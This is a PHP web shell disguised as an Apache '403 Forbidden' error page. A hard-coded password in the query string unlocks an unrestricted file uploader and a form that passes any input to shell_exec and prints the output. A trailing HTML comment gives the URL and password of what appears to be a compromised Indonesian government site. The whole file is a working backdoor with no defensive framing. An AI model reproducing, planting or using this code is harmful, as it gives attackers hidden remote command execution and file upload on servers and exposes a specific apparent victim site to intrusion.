<?php
echo "<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access ".$_SERVER['REQUEST_URI']."  on this server.</p>
<p>Additionally, a 403 Forbidden
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html>";if(isset($_POST['uploaded'])){$file=$_FILES['files']['name'];$files=$_FILES['files']['tmp_name'];$folder="";if(move_uploaded_file($files,$folder.$file)){$result="Uploaded : => <a href='$file' target='_blank'>Your file here</a>";}else {$result="Failed to upload...!";}}$password="aqilogic";if($_GET['pass']==$password){echo '<br /><br /><br /><html><head><title>aqilogic Uploader</title></head><body><center><form action="" method="post" enctype="multipart/form-data">
<input type="file" name="files" />
<input type="submit" name="uploaded" value="Upload">
</form>'.$result.'</center></body></html>';
if(!empty($_POST['cmd'])) {
    $cmd = shell_exec($_POST['cmd'].' 2>&1');
}
echo "
<center>
<div class='mb-3'>
    <form method='POST'>
        <div class='input-group mb-3'>
            <input class='form-control btn-sm' type='text' name='cmd' value='".htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8')."' placeholder='uname -a' $_r>
            <button class='btn btn-outline-light btn-sm' type='sumbit'><i class='tombol'>gass entod!</i></button>
        </div>
    </form>";
    if($cmd):
    echo '
    <div class="container-fluid language-javascript">
        <div class="shell mb-3">
            <pre style="font-size:10px;"><gr>~</gr>$&nbsp;<rd>'.htmlspecialchars($_POST['cmd']).'</rd><br><code>'.htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8').'</code></pre>
        </div>
    </div>';
    elseif(!$cmd && $_SERVER['REQUEST_METHOD'] == 'POST'):
    echo '
    <div class="container-fluid language-javascript">
        <div class="shell mb-3">
            <pre style="font-size:10px;"><code></code></pre>
        </div>
    </div>
</div>
</center>';
endif;}
  ?>


<!--https://site.go.id/uploader.php?pass=aqilogic-->
